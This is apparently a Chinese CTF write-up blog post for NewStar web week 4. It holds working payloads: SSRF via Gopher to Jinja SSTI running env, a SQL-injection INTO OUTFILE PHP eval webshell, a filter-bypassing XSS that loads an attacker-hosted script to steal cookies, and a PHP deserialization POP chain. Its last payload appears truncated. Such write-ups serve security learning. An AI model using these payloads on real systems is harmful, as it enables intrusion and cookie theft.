---
title: "Newstar web week4 - Rycarls little blog"
source: "https://blog.rycarl.cn/index.php/2025/11/02/newstar-web-week4/"
author:
  - "[[Rycarl]]"
published:
created: 2026-06-09
description: "当你站在这里的时候，已经证明了你的毅力 武功秘籍 题目意思很明显了，要我们去找CVE 根据网站的dcrcms搜索漏洞 这里就考察自己的信息搜集能力 我们找到一个文件上传漏洞 但这个神人csdn需要VIP才能看，我们换一篇文章文件上传漏洞 但是需要登录后台才行 我们看看登录面板，如果没有SQL注..."
tags:
  - "clippings"
---
---
title: "Newstar web week4 - Rycarls little blog"
source: "https://blog.rycarl.cn/index.php/2025/11/02/newstar-web-week4/"
author: "[[Rycarl]]"
published: ""
created: "2026-06-09T21:08:22+08:00"
description: "当你站在这里的时候，已经证明了你的毅力 武功秘籍 题目意思很明显了，要我们去找CVE 根据网站的dcrcms搜索漏洞 这里就考察自己的信息搜集能力 我们找到一个文件上传漏洞 但这个神人csdn需要VIP才能看，我们换一篇文章文件上传漏洞 但是需要登录后台才行 我们看看登录面板，如果没有SQL注..."
tags: [clippings]
---

# Newstar web week4 - Rycarls little blog

## Newstar web week4

547次阅读

[

没有评论

](#comments)

共计 7815 个字符，预计需要花费 20 分钟才能阅读完成。

##### 当你站在这里的时候，已经证明了你的毅力

## 武功秘籍

题目意思很明显了，要我们去找 CVE  
根据网站的 dcrcms 搜索漏洞  
这里就考察自己的信息搜集能力  
  
我们找到一个文件上传漏洞  
但这个神人 csdn 需要 VIP 才能看，我们换一篇文章 [文件上传漏洞](https://blog.csdn.net/weixin_70137901/article/details/134065051)  
但是需要登录后台才行  
我们看看登录面板，如果没有 SQL 注入的话多半就是弱口令或者提示你哪里有账号密码  
  
这里提示我们是弱口令，直接 admin/admin 登陆成功  
接下来按着文章复现即可，我就不再多说

## ssti 在哪里？

题目给了三个附件

两个 python 的 flask，以及一个 php  
分析源码，发现存在 5000 和 5001 端口，访问关系正常为 5000 端口 POST 请求传入 name 参数，然后通过 5001 端口请求显示  
对本题目来说我们可以直接向 5001 端口发送请求即可，毕竟能访问 5000 也就不需要访问 5001 了，5001 的端口监听为 localhost，所以构造向 localhost:5001 访问的 ssti 模板注入就行

php 部分很明显的 ssrf 漏洞

```php
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['url'])) {$url = $_POST['url'];

 

    $ch = curl_init();

    // 配置 curl

    curl_setopt($ch, CURLOPT_URL, $url);

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

    curl_setopt($ch, CURLOPT_TIMEOUT, 10);

 

    $result = curl_exec($ch);

    curl_close($ch);

}

 

?>
```

我们使用 Gopher 协议去构造发送 5001 的带有模板注入的数据包

什么是 Gopher 协议?[Gopher](https://www.cnblogs.com/bonelee/p/15194031.html)

```sql
Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。gopher 协议支持发出 GET、POST 请求：可以先截获 get 请求包和 post 请求包，在构成符合 gopher 协议的请求。gopher 协议是 ssrf 利用中最强大的协议
```

payload：

```perl
gopher://localhost:5001/_POST%20/%20HTTP/1.1%0D%0AHost:%20localhost:5001%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0AContent-Length:%2018%0D%0A%0D%0Atemplate={{7*7}}
```

然后把 {{7\*7}} 改成你自己的 payload 就可以命令执行了  
记得修改前面的 content-lenth 要符合数据包结构  
flag 在环境变量里  
最后的 POC

```perl
POST / HTTP/1.1

Host: 39.106.48.123:27711

Origin: http://39.106.48.123:27711

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Upgrade-Insecure-Requests: 1

Referer: http://39.106.48.123:27711/

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9

Cache-Control: max-age=0

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36

Content-Length: 5

 

url=gopher%3A%2F%2Flocalhost%3A5001%2F_POST%2520%2F%2520HTTP%2F1.1%250D%250AHost%3A%2520localhost%3A5001%250D%250AContent-Type%3A%2520application%2Fx-www-form-urlencoded%250D%250AContent-Length%3A%252091%250D%250A%250D%250Atemplate%3D%7B%7B+lipsum.__globals__%5B%27__builtins__%27%5D%5B%27__import__%27%5D%28%27os%27%29.popen%28%27env%27%29.read%28%29+%7D%7D
```

## sqlupload

下载附件里面有个 readflag.c  
而且 start.sh 的特意配置 secure\_file\_priv 为空，也就是很明显需要我们去执行命令  
那么我们肯定就是要写 websehll 了  
getfileflist.php 很明显存在 sql 注入漏洞

```php
try {$mysqli = new mysqli($DB_HOST, $DB_USER, $DB_PASS, $DB_NAME, (int)$DB_PORT);

    if ($mysqli->connect_errno) {json_error('数据库连接失败:' . $mysqli->connect_error, 500);

    }

    $mysqli->set_charset('utf8mb4');

    $order = $_GET['order'] ?? "upload_time";

    if (!preg_match("/upload_time|id/", $order)) {json_error("非法的 order 参数", 400);

    }

    $sql = "SELECT id, filename, upload_time

            FROM uploads

            ORDER BY $order";

    $result = $mysqli->query($sql);
```

那么我们思路是先上传一个名字是一句话木马的文件  
然后查询文件列表，把查询结果写入 webshell.php  
POC

```
POST /upload.php HTTP/1.1

Host: eci-2zeczqrwofz8eg3f4w5q.cloudeci1.ichunqiu.com:80

Connection: keep-alive

Content-Length: 223

sec-ch-ua-platform: "Windows"

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36

sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZpPbx5DxG6ykUyHT

sec-ch-ua-mobile: ?0

Accept: */*

Origin: https://eci-2zeczqrwofz8eg3f4w5q.cloudeci1.ichunqiu.com:80

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: cors

Sec-Fetch-Dest: empty

Referer: https://eci-2zeczqrwofz8eg3f4w5q.cloudeci1.ichunqiu.com:80/

Accept-Encoding: gzip, deflate, br, zstd

Accept-Language: zh-CN,zh;q=0.9

 

------WebKitFormBoundaryZpPbx5DxG6ykUyHT

Content-Disposition: form-data; name="file"; filename="<?php @eval($_POST['123']); ?>"

Content-Type: application/octet-stream

 

<?php @eval($_POST['123']); ?>

------WebKitFormBoundaryZpPbx5DxG6ykUyHT--
```
```makefile
GET /getFileList.php?order=id+INTO+OUTFILE+'/var/www/html/shell.php' HTTP/1.1

Host: eci-2zeczqrwofz8eg3f4w5q.cloudeci1.ichunqiu.com:80

Connection: keep-alive

sec-ch-ua-platform: "Windows"

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36

Accept: text/html,*/*

sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"

sec-ch-ua-mobile: ?0

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: cors

Sec-Fetch-Dest: empty

Referer: https://eci-2zeczqrwofz8eg3f4w5q.cloudeci1.ichunqiu.com:80/

Accept-Encoding: gzip, deflate, br, zstd

Accept-Language: zh-CN,zh;q=0.9
```

## 小 E 的留言板

根据题目描述很明显是考 XSS  
![Newstar web week4](https://img2024.cnblogs.com/blog/3552648/202511/3552648-20251107104047347-44070053.png "Newstar web week4")  
什么是 XSS?  
`XSS 全称跨站脚本 (Cross Site Scripting)，为避免与层叠样式表(Cascading Style Sheets, CSS) 的缩写混淆，故缩写为 XSS。这是一种将任意 Javascript 代码插入到其他 Web 用户页面里执行以达到攻击目的的漏洞。攻击者利用浏览器的动态展示数据功能，在 HTML 页面里嵌入恶意代码。当用户浏览改页时，这些潜入在 HTML 中的恶意代码会被执行，用户浏览器被攻击者控制，从而达到攻击者的特殊目的，如 cookie 窃取等。`

那我们的目的就是插入 payload，使得受害者的 cookie 返回到我们的机器上  
经过测试我们发现部分关键词会被置空，这里我们采用双写绕过  
可以使用 html 实体编码绕过 <  
payload

```javascript
"autofofocuscus oonnfofocuscus="var s=document.createElement('scrscriptipt');s.src='https:// 此处为你注册得到的 domain';document.head.appendChild(s)
```

最后用户访问页面返回 cookie 数据  
  
payload 里面的 https:// 此处为你注册得到的 domain  
需要你自己去找 XSS 平台或者自己搭建一个，要确保别人能够访问到

关于 XSS 更多学习地方 [xss 从 0 到 1](https://drun1baby.top/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/)

## 小羊走迷宫

题目考点是 php 反序列化  
什么是 php 反序化?

**PHP 反序列化基础原理**  
序列化与反序列化的概念  
在 PHP 中，序列化 (Serialization)是将对象的状态信息转化为可存储或传输的形式（通常是字符串）的过程。而反序列化 (Deserialization) 则是将序列化后的字符串重新转换回对象的过程。这两个过程相辅相成，为数据的存储和传输提供了便利。

PHP 提供了两个主要函数来处理序列化和反序列化：

```
serialize()：将对象转换为字符串

 

unserialize()：将字符串转换回对象
```

序列化的主要目的是：

将对象状态保存在文件或数据库中

将对象进行远程传输（如前后端交互发送数据）

**序列化的实现方式**  
让我们通过一个简单的示例来理解 PHP 序列化的工作原理：

```php
class Test {public $flag = "flag{*****}";

    public $name = "lang";

    public $age = 10;

}

 

$test1 = new Test();

$test1->flag = true;

$test1->name = "xiaoming";

$test1->age = 20;

 

// 序列化对象

echo serialize($test1);
```

运行上述代码会输出以下序列化字符串：

`O:4:"Test":3:{s:4:"flag";b:1;s:4:"name";s:8:"xiaoming";s:3:"age";i:20;}`

这个字符串的结构解析如下：

O：表示对象类型

4：类名长度（“Test”是 4 个字符）

"Test"：类名

3：对象属性数量

每个属性由 s（字符串）、b（布尔）或 i（整数）开头，后跟属性名和值

**访问控制修饰符对序列化的影响**  
PHP 中的访问控制修饰符（public、protected、private）会影响序列化后的字符串格式：

```php
class Test {

    public $publicProp = "public";

    protected $protectedProp = "protected";

    private $privateProp = "private";

}

 

$test = new Test();

echo serialize($test);
```

输出结果为：  
` O:4:"Test":3:{s:10:"publicProp";s:6:"public";s:16:"*protectedProp";s:9:"protected";s:17:"TestprivateProp";s:7:"private";}`

注意观察不同访问修饰符的处理方式：

public 属性保持原样

protected 属性被序列化为属性名格式（前面有一个空字符）

private 属性被序列化为类名属性名格式（前后都有空字符）

这些空字符在 URL 编码中会表示为 %00，例如 %00\*%00protectedProp 和 %00Test%00privateProp。

**反序列化过程**  
反序列化是序列化的逆过程，使用 unserialize()函数：

```swift
$serialized = 'O:4:"Test":3:{s:4:"flag";b:1;s:4:"name";s:5:"zhang";s:3:"age";i:20;}';

$obj = unserialize($serialized);

var_dump($obj);
```

输出结果为：

```csharp
object(Test){["flag"]=>

  bool(true)

  ["name"]=>

  string(5) "zhang"

  ["age"]=>

  int(20)

}
```

反序列化过程不仅恢复对象的属性值，还会重新建立对象的内部状态。这一过程看似简单，但正是反序列化漏洞的根源。  
引用： [CSDN-php 反序列化基础](https://blog.csdn.net/2301_79944585/article/details/149651205)

而这道题是 pop 链，我们需要像一条链子一样一步一步找到道路去到达最后存在漏洞的地方去执行恶意代码

分析源码：经典的 PHP 反序列化题目，首先需要传入 ma\_ze.path，然后 base64 解码反序列化得到 flag，根据已知源码和 PHP 魔术方法（不熟悉的可以自行百度，一搜一大堆文章介绍）可以得到调用链为：

```
startPoint 类的__wakeup 方法

    --SaySomething 类的__invoke 方法

        --Treasure 类的__toString 方法

            --Treasure 类的__get 方法

                --endPoint 类的__call 方法

                    --flag
```

知识点 1：参数绕过的知识点：$\_GET\[‘ma *ze.path’\]  
\==> PHP 变量命名规则：PHP 的变量名不能包含小数点.，因为小数点在 PHP 中是无效的变量名字符。为了处理这种情况，PHP 在解析请求参数时会自动将参数名中的. 替换为* 。  
但是，如果已经前面有一个中括号 `[` 转变为下划线 `_` 了，下一个小数点就不会转变了。  
\==> ma\[ze.path

知识点 2：伪协议读取文件

php://filter/read=convert.base64-encode/resource=flag.php

读取源代码并进行 base64 编码输出

开始构造调用链并赋值：

注意 `$this -> chest = $this`; 因为要先触发 toString 方法再触发 get 方法，所以不能实例化两次，可以用 `$this` 表明使用当前实例。

```php
<?php

class startPoint{

    public $direction;

    function __construct(){//SaySomething.__invoke()

        $this -> direction = new SaySomething();}

}

class Treasure{

    protected $door;

    protected $chest;

    function __construct(){//Treasure.__get()

        $this -> chest = $this;

        //endPoint.__call()

        $this -> door = new endPoint();}

    function __get($arg){

        echo "拿到钥匙咯，开门！";

        $this -> door -> open();}

    function __toString(){

        echo "小羊真可爱!";

        return $this -> chest -> key;

    }

}

class SaySomething{

    public $sth;

    function __construct(){//Treasure.__toString()

        $this -> sth = new Treasure();}

}

class endPoint{

    private $path;

    function __construct(){

        //flag.php

        $this -> path = 'php://filter/read=convert.base64-encode/resource=flag.php';

    }

}

 

$exp = new startPoint();

echo "ma[ze.path=".base64_encode(serialize($exp));

?>
```

执行输出 payload：

```lua
ma[ze.path=TzoxMDoic3RhcnRQb2ludCI6MTp7czo5OiJkaXJlY3Rpb24iO086MTI6IlNheVNvbWV0aGluZyI6MTp7czozOiJzdGgiO086ODoiVHJlYXN1cmUi
```

正文完

0

版权声明：本站原创文章，由 于2025-11-02发表，共计7815字。

转载说明：除特殊说明外本站文章皆由CC-4.0协议发布，转载请注明出处。